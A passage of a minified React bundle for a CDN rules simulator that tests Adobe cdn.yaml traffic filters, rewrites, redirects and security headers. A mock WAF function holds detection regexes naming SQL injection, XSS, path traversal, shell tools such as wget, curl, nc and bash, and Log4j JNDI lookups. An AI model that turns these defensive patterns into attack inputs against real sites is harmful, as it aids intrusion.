t;t="clientIp"===a?!g(i,e.notIn):!e.notIn.includes(i);const n=e.notIn.length>5?"[".concat(e.notIn.slice(0,3).join(", "),", ... +").concat(e.notIn.length-3," more]"):"[".concat(e.notIn.join(", "),"]");return{matches:t,property:a,operator:"notIn",expected:e.notIn,actual:i,reason:t?"\u2713 ".concat(a,' "').concat(i,'" is not in list ').concat(n):"\u2717 ".concat(a,' "').concat(i,'" is in list ').concat(n," (should not be)")}}if(void 0!==e.exists){const t=void 0!==i&&null!==i&&""!==i,n=e.exists?t:!t;return{matches:n,property:a,operator:"exists",expected:e.exists,actual:i,reason:n?"\u2713 ".concat(a," ").concat(e.exists?"exists":"does not exist"):"\u2717 ".concat(a," ").concat(t?"exists":"does not exist"," (expected ").concat(e.exists?"to exist":"not to exist",")")}}return{matches:!0,reason:"Condition not recognized (defaulting to match)"}}catch(a){return{matches:!1,reason:"\u26a0\ufe0f Error evaluating condition: ".concat(a.message),error:a.message}}},v=(e,t,n)=>{var r;if("reqHeader"===t&&null!==n&&void 0!==n&&n.name)return(null===(r=e.headers)||void 0===r?void 0:r[n.name])||"";const a={path:e.path,domain:e.domain,host:e.domain,tier:e.tier,clientIp:e.clientIp,clientCountry:e.clientCountry,clientRegion:e.clientRegion,method:e.method,protocol:e.protocol,queryString:e.queryString,url:e.url,userAgent:e.userAgent};return void 0!==a[t]?a[t]:e[t]},x=(e,t)=>{const n={type:t.type,before:{},after:{},description:"",applied:!1};try{if("transform"===t.type){var r;const a=t.reqProperty||t.reqHeader||t.var||"path",i=t.reqProperty?"reqProperty":t.reqHeader?"reqHeader":"var";let s="reqHeader"===i?null===(r=e.headers)||void 0===r?void 0:r[t.reqHeader]:e[a];if(void 0!==s&&null!==s||(s=""),n.target=a,n.targetType=i,n.before[a]=s,"replace"===t.op)try{const r=t.replacement||"";let o=r.replace(/\\(\d+)/g,"$$$1");n.debug={originalMatch:t.match,originalReplacement:r,jsReplacement:o,inputValue:s};const l=new RegExp(t.match),c=l.test(String(s));if(n.debug.regexMatches=c,c){const e=String(s).match(l);n.debug.captureGroups=e?e.slice(1):[]}const u=String(s).replace(l,o);n.debug.outputValue=u,u!==s?(n.applied=!0,n.after[a]=u,n.description="Transform ".concat("reqHeader"===i?"header ":"").concat(a,': "').concat(s,'" \u2192 "').concat(u,'"'),n.regex=t.match,n.replacement=r,n.jsReplacement=o,"reqHeader"===i?e.headers=Tt(Tt({},e.headers),{},{[t.reqHeader]:u}):e[a]=u):(n.applied=!1,n.description=c?"Transform ".concat(a,": Regex matched but replacement resulted in same value"):"Transform ".concat(a,": No change (regex /").concat(t.match,"/ didn't match \"").concat(s,'")'),n.regex=t.match)}catch(o){n.error="Regex error: ".concat(o.message),n.description='Transform failed: Invalid regex "'.concat(t.match,'" - ').concat(o.message)}else if("tolower"===t.op){const r=String(s).toLowerCase();r!==s?(n.applied=!0,n.after[a]=r,n.description="Transform ".concat(a,' to lowercase: "').concat(s,'" \u2192 "').concat(r,'"'),"reqHeader"===i?e.headers=Tt(Tt({},e.headers),{},{[t.reqHeader]:r}):e[a]=r):n.description="Transform ".concat(a,": Already lowercase")}}else if("set"===t.type)if(t.reqHeader){var a;let r="object"===typeof t.value?JSON.stringify(t.value):t.value;const i=(e=>{if("string"===typeof e&&e.includes("${{")){var t;const n=(null===(t=e.match(/\$\{\{(\w+)\}\}/))||void 0===t?void 0:t[1])||"SECRET";return{displayValue:"[Secret: ".concat(n,"]"),isSecret:!0,secretName:n}}return{displayValue:e,isSecret:!1}})(r);n.target=t.reqHeader,n.targetType="reqHeader",n.before[t.reqHeader]=null===(a=e.headers)||void 0===a?void 0:a[t.reqHeader],n.after[t.reqHeader]=i.displayValue,n.applied=!0,n.isSecret=i.isSecret,i.isSecret?(n.description='Set header "'.concat(t.reqHeader,'": ').concat(i.displayValue," (secret reference - actual value from Cloud Manager)"),e.headers=Tt(Tt({},e.headers),{},{[t.reqHeader]:"[".concat(i.secretName,"]")})):(n.description='Set header "'.concat(t.reqHeader,'": "').concat(r,'"'),e.headers=Tt(Tt({},e.headers),{},{[t.reqHeader]:r}))}else if(t.reqProperty){const r="object"===typeof t.value?JSON.stringify(t.value):t.value;n.target=t.reqProperty,n.targetType="reqProperty",n.before[t.reqProperty]=e[t.reqProperty],n.after[t.reqProperty]=r,n.applied=!0,n.description="Set ".concat(t.reqProperty,': "').concat(r,'"'),e[t.reqProperty]=r}else t.queryParam?(n.target=t.queryParam,n.targetType="queryParam",n.applied=!0,n.description='Set query parameter "'.concat(t.queryParam,'": "').concat(t.value,'"')):t.var?(n.target=t.var,n.targetType="variable",n.applied=!0,n.description='Set variable "'.concat(t.var,'": "').concat(t.value,'"')):t.respHeader&&(n.target=t.respHeader,n.targetType="respHeader",n.applied=!0,n.description='Set response header "'.concat(t.respHeader,'": "').concat(t.value,'"'));else if("unset"===t.type)if(t.reqHeader){var i,s;n.target=t.reqHeader,n.targetType="reqHeader",n.before[t.reqHeader]=null===(i=e.headers)||void 0===i?void 0:i[t.reqHeader],n.applied=!0,n.description='Unset header "'.concat(t.reqHeader,'"');const r=e.headers||{},{[s=t.reqHeader]:a}=r,o=function(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n={};for(var r in e)if({}.hasOwnProperty.call(e,r)){if(-1!==t.indexOf(r))continue;n[r]=e[r]}return n}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],-1===t.indexOf(n)&&{}.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}(r,[s].map(Ct));e.headers=o}else t.queryParamMatch?(n.target="queryParams",n.targetType="queryParamMatch",n.applied=!0,n.description="Remove query params matching regex: ".concat(t.queryParamMatch)):t.respHeader&&(n.target=t.respHeader,n.targetType="respHeader",n.applied=!0,n.description='Unset response header "'.concat(t.respHeader,'"'))}catch(l){n.error=l.message,n.description="Action failed: ".concat(l.message)}return n},b=function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0;return e?"allOf"===e.type||"anyOf"===e.type?(0,i.jsxs)("div",{className:"condition-group ".concat(e.type," ").concat(e.matches?"matched":"not-matched"),children:[(0,i.jsxs)("div",{className:"condition-group-header",children:[(0,i.jsx)("span",{className:"condition-badge ".concat(e.matches?"pass":"fail"),children:"allOf"===e.type?"ALL OF":"ANY OF"}),(0,i.jsx)("span",{className:"condition-summary",children:e.reason})]}),(0,i.jsx)("div",{className:"condition-children",children:null===(n=e.details)||void 0===n?void 0:n.map((e,n)=>(0,i.jsxs)("div",{className:"condition-child ".concat(e.matches?"matched":"not-matched"),children:[(0,i.jsxs)("span",{className:"condition-index",children:["#",e.index]}),e.type?b(e,t+1):(0,i.jsx)("span",{className:"condition-simple",children:e.reason})]},n))})]}):(0,i.jsx)("span",{className:"condition-simple",children:e.reason}):null;var n};return(0,i.jsxs)("div",{className:"rules-simulator",children:[(0,i.jsx)("div",{className:"simulator-header",children:(0,i.jsxs)("div",{children:[(0,i.jsxs)("h1",{children:[(0,i.jsx)("svg",{width:"28",height:"28",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("polygon",{points:"5 3 19 12 5 21 5 3"})}),"CDN Rules Simulator"]}),(0,i.jsxs)("p",{children:["Simulate how your cdn.yaml rules process requests step-by-step based on ",(0,i.jsx)("a",{href:"https://experienceleague.adobe.com/en/docs/experience-manager-cloud-service/content/implementing/content-delivery/cdn-configuring-traffic#order-of-evaluation",target:"_blank",rel:"noopener noreferrer",children:"Adobe's order of evaluation"})]})]})}),(0,i.jsxs)("div",{className:"evaluation-order-bar",children:[(0,i.jsx)("span",{className:"order-label",children:"Evaluation Order:"}),m.map((e,t)=>(0,i.jsxs)(r.Fragment,{children:[(0,i.jsxs)("div",{className:"order-step",title:e.description,children:[(0,i.jsx)("span",{className:"order-icon",children:e.icon}),(0,i.jsx)("span",{className:"order-name",children:e.name})]}),t<m.length-1&&(0,i.jsx)("span",{className:"order-arrow",children:"\u2192"})]},e.id))]}),(0,i.jsxs)("div",{className:"simulator-tabs",children:[(0,i.jsx)("button",{className:"tab-btn ".concat("config"===h?"active":""),onClick:()=>f("config"),children:"\ud83d\udcc4 CDN Configuration"}),(0,i.jsx)("button",{className:"tab-btn ".concat("request"===h?"active":""),onClick:()=>f("request"),children:"\ud83d\udce8 Test Request"}),(0,i.jsxs)("button",{className:"tab-btn ".concat("results"===h?"active":""),onClick:()=>f("results"),disabled:!c,children:["\ud83d\udcca Results ",c&&"(".concat(c.matchedRules.length," matched)")]})]}),"config"===h&&(0,i.jsxs)("div",{className:"config-panel card",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsx)("h3",{className:"card-title",children:"cdn.yaml Configuration"}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>{s('kind: "CDN"\nversion: "1"\nmetadata:\n  envTypes:\n    - dev\n    - stage\n    - prod\ndata:\n  # ---------------------------------------------------------------------------\n  # TRAFFIC FILTER RULES - Security & Access Control\n  # ---------------------------------------------------------------------------\n  trafficFilters:\n    rules:\n      # IP Allowlist Example - Restrict access to specific IPs\n      - name: "preview-ip-allowlist"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: domain, equals: "preview.your-domain.com" }\n            - { reqProperty: clientIp, notIn: [\n                "10.0.0.0/8",       # Private network\n                "172.16.0.0/12",    # Private network\n                "192.168.0.0/16",   # Private network\n              ] }\n        action:\n          type: block\n\n      # WAF - Block attacks from known bad IPs (Adobe recommended)\n      - name: "block-attacks-from-bad-ips"\n        when:\n          reqProperty: tier\n          in: ["author", "publish"]\n        action:\n          type: block\n          wafFlags:\n            - ATTACK-FROM-BAD-IP\n\n      # WAF - Log all attack patterns (Adobe recommended)\n      - name: "log-all-attacks"\n        when:\n          reqProperty: tier\n          in: ["author", "publish"]\n        action:\n          type: log\n          wafFlags:\n            - ATTACK\n\n      # Rate Limiting - Origin requests\n      - name: "rate-limit-origin"\n        when:\n          reqProperty: tier\n          equals: publish\n        rateLimit:\n          limit: 100\n          window: 10\n          count: fetches\n          penalty: 300\n          groupBy:\n            - reqProperty: clientIp\n        action: log\n\n      # Rate Limiting - Edge requests\n      - name: "rate-limit-edge"\n        when:\n          reqProperty: tier\n          equals: publish\n        rateLimit:\n          limit: 500\n          window: 10\n          count: all\n          penalty: 300\n          groupBy:\n            - reqProperty: clientIp\n        action: log\n\n      # Block OFAC sanctioned countries\n      - name: "block-ofac-countries"\n        when:\n          allOf:\n            - { reqProperty: tier, in: ["author", "publish"] }\n            - reqProperty: clientCountry\n              in: [SY, BY, MM, KP, IQ, CD, SD, IR, LR, ZW, CU, CI]\n        action: block\n\n      # Block admin paths on publish\n      - name: "block-admin-paths"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: path, like: "/admin/*" }\n        action: block\n\n  # ---------------------------------------------------------------------------\n  # REQUEST TRANSFORMATIONS - Modify incoming requests\n  # ---------------------------------------------------------------------------\n  requestTransformations:\n    removeMarketingParams: true\n    rules:\n      # Set authorization header from secret\n      - name: "set-auth-header"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: domain, equals: "preview.your-domain.com" }\n        actions:\n          - type: set\n            reqHeader: authorization\n            value: "${{YOUR_SITE_TOKEN}}"\n          - type: transform\n            reqHeader: authorization\n            op: replace\n            match: "^(?!token\\\\s+)(.*)$"\n            replacement: "token \\\\1"\n\n      # Root path rewrite to default language\n      - name: "rewrite-root-to-default-lang"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: path, equals: "/" }\n        actions:\n          - type: transform\n            reqProperty: path\n            op: replace\n            match: "^/$"\n            replacement: "/us/en"\n\n      # Language prefix rewrite: /jp/* -> /jp/ja/*\n      - name: "rewrite-jp-language"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: path, matches: "^/jp(/.*)?$" }\n            - { reqProperty: path, doesNotMatch: "^/jp/ja(/.*)?$" }\n            - { reqProperty: path, doesNotMatch: ".*\\\\.html$" }\n            - { reqProperty: path, doesNotMatch: "^/(content|etc|media_).*$" }\n        actions:\n          - type: transform\n            reqProperty: path\n            op: replace\n            match: "^/jp(/.*)?$"\n            replacement: "/jp/ja\\\\1"\n\n      # Catch-all language prefix: /* -> /us/en/*\n      - name: "rewrite-default-language"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: path, doesNotMatch: "^/us/en(/.*)?$" }\n            - { reqProperty: path, doesNotMatch: "^/jp(/.*)?$" }\n            - { reqProperty: path, doesNotMatch: "^/$" }\n            - { reqProperty: path, doesNotMatch: ".*\\\\.html$" }\n            - { reqProperty: path, doesNotMatch: "^/(content|etc|media_).*$" }\n        actions:\n          - type: transform\n            reqProperty: path\n            op: replace\n            match: "^/(.*)$"\n            replacement: "/us/en/\\\\1"\n\n  # ---------------------------------------------------------------------------\n  # ORIGIN SELECTORS - Route to different backends\n  # ---------------------------------------------------------------------------\n  originSelectors:\n    rules:\n      - name: "route-to-preview-origin"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: domain, equals: "preview.your-domain.com" }\n        action:\n          type: selectOrigin\n          originName: preview-origin\n\n      - name: "route-to-live-origin"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: domain, equals: "www.your-domain.com" }\n        action:\n          type: selectOrigin\n          originName: live-origin\n\n    origins:\n      - name: preview-origin\n        domain: main--your-repo--your-org.aem.page\n        forwardCookie: true\n        forwardAuthorization: true\n\n      - name: live-origin\n        domain: main--your-repo--your-org.aem.live\n        forwardCookie: true\n        forwardAuthorization: true\n\n  # ---------------------------------------------------------------------------\n  # REDIRECTS - URL Normalization\n  # ---------------------------------------------------------------------------\n  redirects:\n    rules:\n      # Normalize case and underscores\n      - name: "normalize-case-underscores"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: path, matches: ".*[A-Z_].*" }\n            - { reqProperty: path, doesNotMatch: ".*\\\\.(png|jpg|css|js)$" }\n        action:\n          type: redirect\n          status: 301\n          location:\n            reqProperty: path\n            transform:\n              - op: replace\n                match: "_"\n                replacement: "-"\n              - op: tolower\n\n      # Remove .html extension\n      - name: "normalize-remove-html"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: path, matches: "^(?!.*?/index\\\\.html$).+\\\\.html$" }\n        action:\n          type: redirect\n          status: 301\n          location:\n            reqProperty: path\n            transform:\n              - op: replace\n                match: "\\\\.html$"\n                replacement: ""\n\n      # Remove trailing slash\n      - name: "normalize-trailing-slash"\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: path, matches: "^.+/$" }\n        action:\n          type: redirect\n          status: 301\n          location:\n            reqProperty: path\n            transform:\n              - op: replace\n                match: "/$"\n                replacement: ""\n\n  # ---------------------------------------------------------------------------\n  # RESPONSE TRANSFORMATIONS - Security Headers\n  # ---------------------------------------------------------------------------\n  responseTransformations:\n    rules:\n      - name: "security-headers"\n        when:\n          reqProperty: tier\n          equals: publish\n        actions:\n          - type: set\n            respHeader: Strict-Transport-Security\n            value: "max-age=31536000; includeSubDomains; preload"\n          - type: set\n            respHeader: X-Content-Type-Options\n            value: "nosniff"\n          - type: set\n            respHeader: X-Frame-Options\n            value: "SAMEORIGIN"\n          - type: set\n            respHeader: Referrer-Policy\n            value: "strict-origin-when-cross-origin"\n          - type: set\n            respHeader: Permissions-Policy\n            value: "geolocation=(), microphone=(), camera=()"\n')},children:"Load Sample with Transformations"})]}),(0,i.jsx)("textarea",{className:"yaml-textarea",value:a,onChange:e=>s(e.target.value),placeholder:"Paste your cdn.yaml configuration here...",spellCheck:"false"}),d&&(0,i.jsxs)("div",{className:"parse-error",children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,i.jsx)("line",{x1:"15",y1:"9",x2:"9",y2:"15"}),(0,i.jsx)("line",{x1:"9",y1:"9",x2:"15",y2:"15"})]}),d]})]}),"request"===h&&(0,i.jsxs)("div",{className:"request-panel card",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsx)("h3",{className:"card-title",children:"Test Request Configuration"}),(0,i.jsx)("p",{className:"card-subtitle",children:"Configure the incoming request to simulate"})]}),(0,i.jsxs)("div",{className:"request-form",children:[(0,i.jsxs)("div",{className:"form-section",children:[(0,i.jsx)("h4",{children:"\ud83d\udccd Request Properties"}),(0,i.jsxs)("div",{className:"form-grid",children:[(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsxs)("label",{children:["Path ",(0,i.jsx)("span",{className:"required",children:"*"})]}),(0,i.jsx)("input",{type:"text",className:"form-input",value:o.path,onChange:e=>l(Tt(Tt({},o),{},{path:e.target.value})),placeholder:"/jp/products/test.html"}),(0,i.jsx)("span",{className:"form-hint",children:"The URL path to test (e.g., /jp/products)"})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsxs)("label",{children:["Domain ",(0,i.jsx)("span",{className:"required",children:"*"})]}),(0,i.jsx)("input",{type:"text",className:"form-input",value:o.domain,onChange:e=>l(Tt(Tt({},o),{},{domain:e.target.value})),placeholder:"preview.example.com"})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{children:"Method"}),(0,i.jsx)("select",{className:"form-select",value:o.method,onChange:e=>l(Tt(Tt({},o),{},{method:e.target.value})),children:["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"].map(e=>(0,i.jsx)("option",{value:e,children:e},e))})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsxs)("label",{children:["Tier ",(0,i.jsx)("span",{className:"required",children:"*"})]}),(0,i.jsxs)("select",{className:"form-select",value:o.tier,onChange:e=>l(Tt(Tt({},o),{},{tier:e.target.value})),children:[(0,i.jsx)("option",{value:"publish",children:"Publish (Public)"}),(0,i.jsx)("option",{value:"author",children:"Author (Internal)"})]})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{children:"Query String"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:o.queryString,onChange:e=>l(Tt(Tt({},o),{},{queryString:e.target.value})),placeholder:"utm_source=google&param=value"})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{children:"Protocol"}),(0,i.jsxs)("select",{className:"form-select",value:o.protocol,onChange:e=>l(Tt(Tt({},o),{},{protocol:e.target.value})),children:[(0,i.jsx)("option",{value:"https",children:"HTTPS"}),(0,i.jsx)("option",{value:"http",children:"HTTP"})]})]})]})]}),(0,i.jsxs)("div",{className:"form-section",children:[(0,i.jsx)("h4",{children:"\ud83c\udf0d Client Properties"}),(0,i.jsxs)("div",{className:"form-grid",children:[(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{children:"Client IP"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:o.clientIp,onChange:e=>l(Tt(Tt({},o),{},{clientIp:e.target.value})),placeholder:"192.168.1.100"})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{children:"Country Code"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:o.clientCountry,onChange:e=>l(Tt(Tt({},o),{},{clientCountry:e.target.value.toUpperCase()})),placeholder:"US",maxLength:2}),(0,i.jsx)("span",{className:"form-hint",children:"ISO 3166-1 alpha-2 (e.g., US, JP, IR)"})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{children:"Region"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:o.clientRegion,onChange:e=>l(Tt(Tt({},o),{},{clientRegion:e.target.value})),placeholder:"CA"})]})]})]}),(0,i.jsxs)("div",{className:"form-section",children:[(0,i.jsx)("h4",{children:"\ud83d\udccb Headers"}),(0,i.jsxs)("div",{className:"form-grid",children:[(0,i.jsxs)("div",{className:"form-group full-width",children:[(0,i.jsx)("label",{children:"User-Agent"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:o.userAgent,onChange:e=>l(Tt(Tt({},o),{},{userAgent:e.target.value})),placeholder:"Mozilla/5.0..."})]}),(0,i.jsxs)("div",{className:"form-group",children:[(0,i.jsx)("label",{children:"Referer"}),(0,i.jsx)("input",{type:"text",className:"form-input",value:o.referer,onChange:e=>l(Tt(Tt({},o),{},{referer:e.target.value})),placeholder:"https://google.com"})]})]})]})]})]}),(0,i.jsxs)("div",{className:"simulation-controls",children:[(0,i.jsxs)("button",{className:"btn btn-primary btn-lg",onClick:()=>{var e,t,n,r;if(p(null),!a.trim())return void p('Please provide a cdn.yaml configuration. Click "Load Sample" for an example.');let i;try{i=ct.load(a)}catch(T){var s;return void p("YAML Parse Error at line ".concat((null===(s=T.mark)||void 0===s?void 0:s.line)||"?",": ").concat(T.message))}if(null===(e=i)||void 0===e||!e.data)return void p('Invalid cdn.yaml: missing "data" section');const l={originalRequest:Tt(Tt({},o),{},{headers:Tt({},o.headers)}),currentRequest:Tt(Tt({},o),{},{headers:Tt({},o.headers)}),evaluationSteps:[],pathHistory:[{path:o.path,phase:"Original Request"}],matchedRules:[],finalAction:"allow",finalStatus:200,redirectLocation:null,selectedOrigin:null,responseHeaders:{},warnings:[],blockingRule:null,blockingRuleDetails:null,wafFlagsDetected:[]};l.wafFlagsDetected=(e=>{const t=[],n=(e.path+"?"+(e.queryString||"")).toLowerCase(),r=(e.userAgent||"").toLowerCase(),a=n+" "+r+" "+JSON.stringify(e.headers||{});return/('|"|;|--|union\s+select|select\s+.*from|insert\s+into|delete\s+from|drop\s+table|update\s+.*set)/i.test(a)&&t.push({flag:"SQLI",pattern:"SQL injection keywords detected"}),/<script|javascript:|onerror\s*=|onload\s*=|<img[^>]+on\w+\s*=/i.test(a)&&t.push({flag:"XSS",pattern:"Cross-site scripting patterns detected"}),/\.\.\/|\.\.\\|%2e%2e/i.test(n)&&t.push({flag:"TRAVERSAL",pattern:"Path traversal sequences detected"}),/;\s*(cat|ls|rm|wget|curl|bash|sh|nc)\s|`.*`|\$\(.*\)/i.test(a)&&t.push({flag:"CMDEXE",pattern:"Command execution patterns detected"}),/\$\{jndi:/i.test(a)&&t.push({flag:"LOG4J-JNDI",pattern:"JNDI lookup patterns detected"}),/nikto|sqlmap|nessus|acunetix|burp|owasp.?zap/i.test(r)&&t.push({flag:"SCANNER",pattern:"Security scanner User-Agent detected"}),e.userAgent&&""!==e.userAgent.trim()||t.push({flag:"NOUA",pattern:"Missing User-Agent header"}),t.length>0&&t.unshift({flag:"ATTACK",pattern:"General attack pattern detected"}),t})(o);const c=i.data.requestTransformations;if(c){const e={phase:"requestTransformations",name:"1. Request Transformations",icon:"\ud83d\udd04",description:"Modifies incoming requests (headers, paths, parameters) before they reach origin",rules:[],globalActions:[],skipped:!1};if(c.removeMarketingParams&&e.globalActions.push({type:"removeMarketingParams",description:"Marketing query parameters (utm_*, gclid, fbclid, etc.) will be automatically removed",applied:!0}),c.rules)for(const t of c.rules){const n=y(t.when,l.currentRequest),r={name:t.name,matched:n.matches,conditionDetails:n,actions:[],pathBefore:l.currentRequest.path,pathAfter:null};if(n.matches){if(l.matchedRules.push({phase:"requestTransformations",rule:t.name,type:"transform"}),t.actions)for(const e of t.actions){const t=x(l.currentRequest,e);r.actions.push(t)}r.pathAfter=l.currentRequest.path,r.pathBefore!==r.pathAfter&&l.pathHistory.push({path:l.currentRequest.path,phase:'After "'.concat(t.name,'"'),rule:t.name,transform:"".concat(r.pathBefore," \u2192 ").concat(r.pathAfter)})}e.rules.push(r)}l.evaluationSteps.push(e)}const d=i.data.trafficFilters;if(null!==d&&void 0!==d&&d.rules){const e={phase:"trafficFilters",name:"2. Traffic Filter Rules (WAF)",icon:"\ud83d\udee1\ufe0f",description:"Evaluates security rules to block or log malicious traffic",rules:[],skipped:!1};for(const t of d.rules){var h,m;const n=y(t.when,l.currentRequest);let r=!0,a=[],i=!1;var g;if(null!==(h=t.action)&&void 0!==h&&h.wafFlags||t.wafFlags)a=(null===(g=t.action)||void 0===g?void 0:g.wafFlags)||t.wafFlags,i=!0,r=a.some(e=>"ATTACK-FROM-BAD-IP"===e?l.wafFlagsDetected.some(e=>"ATTACK"===e.flag)&&(o.clientIp.startsWith("185.")||o.clientIp.startsWith("45.")):l.wafFlagsDetected.some(t=>t.flag===e));const s=n.matches&&r,c={name:t.name,matched:s,conditionMatched:n.matches,conditionDetails:n,wafFlagsRequired:a,wafFlagsMatched:i?r:null,action:"string"===typeof t.action?t.action:(null===(m=t.action)||void 0===m?void 0:m.type)||"unknown",rateLimit:t.rateLimit,appliedAction:null,isBlocking:!1};if(s){var b;l.matchedRules.push({phase:"trafficFilters",rule:t.name,action:c.action});const e="string"===typeof t.action?t.action:null===(b=t.action)||void 0===b?void 0:b.type;if("block"===e){l.finalAction="block",l.finalStatus=403,l.blockingRule=t.name,c.appliedAction="BLOCKED",c.isBlocking=!0;const e=[],r=[];n.details?n.details.forEach(e=>{e.matches&&r.push({matched:!0,reason:e.reason})}):r.push({matched:!0,reason:n.reason}),(t.name.includes("ip-allowlist")||t.name.includes("allowlist"))&&(e.push('Add client IP "'.concat(l.currentRequest.clientIp,'" to the allowlist')),e.push("Or access from an IP already in the allowlist")),(t.name.includes("ofac")||t.name.includes("country"))&&(e.push('Client country "'.concat(l.currentRequest.clientCountry,'" is blocked')),e.push("Access from a non-restricted country")),a.length>0&&(e.push("WAF detected attack patterns: ".concat(a.join(", "))),e.push("Remove malicious patterns from the request")),(t.name.includes("admin")||t.name.includes("block"))&&(e.push('Path "'.concat(l.currentRequest.path,'" matches a blocked pattern')),e.push("Change the request path or remove/modify the blocking rule")),0===e.length&&e.push("Review the rule conditions and modify as needed"),l.blockingRuleDetails={conditions:r,suggestions:e}}else"log"===e?c.appliedAction="LOGGED":"allow"===e&&(c.appliedAction="ALLOWED");if(t.rateLimit){const e=t.rateLimit.limit*t.rateLimit.window;c.rateLimitInfo={limit:t.rateLimit.limit,window:t.rateLimit.window,total:e,penalty:t.rateLimit.penalty||0,description:"Allows ".concat(t.rateLimit.limit," req/sec \xd7 ").concat(t.rateLimit.window,"s = ").concat(e," total requests. Exceeding triggers ").concat(t.rateLimit.penalty,"s penalty.")}}}e.rules.push(c)}l.evaluationSteps.push(e)}if(null!==(t=i.data.responseTransformations)&&void 0!==t&&t.rules){const e={phase:"responseTransformations",name:"3. Response Transformations",icon:"\ud83d\udce4",description:"Modifies outgoing response headers back to the client (evaluated AFTER origin response)",rules:[],skipped:"block"===l.finalAction};if("block"===l.finalAction)e.skipReason='Skipped - Request was blocked by rule "'.concat(l.blockingRule,'"');else for(const t of i.data.responseTransformations.rules){const n=y(t.when,l.currentRequest),r={name:t.name,matched:n.matches,conditionDetails:n,actions:[]};if(n.matches&&(l.matchedRules.push({phase:"responseTransformations",rule:t.name}),t.actions))for(const e of t.actions){const t={type:e.type,applied:!0,description:""};"set"===e.type&&e.respHeader?(l.responseHeaders[e.respHeader]=e.value,t.description='Set response header "'.concat(e.respHeader,'": "').concat(e.value,'"')):"unset"===e.type&&e.respHeader?(delete l.responseHeaders[e.respHeader],t.description='Remove response header "'.concat(e.respHeader,'"')):t.description="Action: ".concat(e.type),r.actions.push(t)}e.rules.push(r)}l.evaluationSteps.push(e)}if(null!==(n=i.data.originSelectors)&&void 0!==n&&n.rules){const e={phase:"originSelectors",name:"4. Origin Selectors",icon:"\ud83c\udfaf",description:"Routes traffic to different backend origins",rules:[],skipped:"block"===l.finalAction};if("block"===l.finalAction)e.skipReason='Skipped - Request was blocked by rule "'.concat(l.blockingRule,'"');else for(const t of i.data.originSelectors.rules){var w;const n=y(t.when,l.currentRequest),r={name:t.name,matched:n.matches,conditionDetails:n,originName:null===(w=t.action)||void 0===w?void 0:w.originName,originConfig:null,selected:!1};if(n.matches&&!l.selectedOrigin){var k,j;l.matchedRules.push({phase:"originSelectors",rule:t.name}),l.selectedOrigin=null===(k=t.action)||void 0===k?void 0:k.originName,r.selected=!0;const e=null===(j=i.data.originSelectors.origins)||void 0===j?void 0:j.find(e=>{var n;return e.name===(null===(n=t.action)||void 0===n?void 0:n.originName)});e&&(r.originConfig=e)}e.rules.push(r)}l.evaluationSteps.push(e)}if(null!==(r=i.data.redirects)&&void 0!==r&&r.rules){const e={phase:"redirects",name:"5. Server-side Redirects",icon:"\u21aa\ufe0f",description:"CDN-level redirects (301, 302, etc.) before reaching origin",rules:[],skipped:"block"===l.finalAction};if("block"===l.finalAction)e.skipReason='Skipped - Request was blocked by rule "'.concat(l.blockingRule,'"');else for(const t of i.data.redirects.rules){var N,S,C;const n=y(t.when,l.currentRequest);let r="",a=[];if(null!==(N=t.action)&&void 0!==N&&N.location)if("string"===typeof t.action.location)r=t.action.location;else if("object"===typeof t.action.location){const e=t.action.location.reqProperty;let n=v(l.currentRequest,e,{});if(t.action.location.transform&&Array.isArray(t.action.location.transform))for(const r of t.action.location.transform){const e=n;try{if("replace"===r.op){let e=(r.replacement||"").replace(/\\(\d+)/g,"$$$1");const t=new RegExp(r.match,"g");n=String(n).replace(t,e)}else"tolower"===r.op&&(n=String(n).toLowerCase());a.push({op:r.op,before:e,after:n,match:r.match,replacement:r.replacement})}catch(T){a.push({op:r.op,error:T.message})}}r=n}const i={name:t.name,matched:n.matches,conditionDetails:n,redirectStatus:(null===(S=t.action)||void 0===S?void 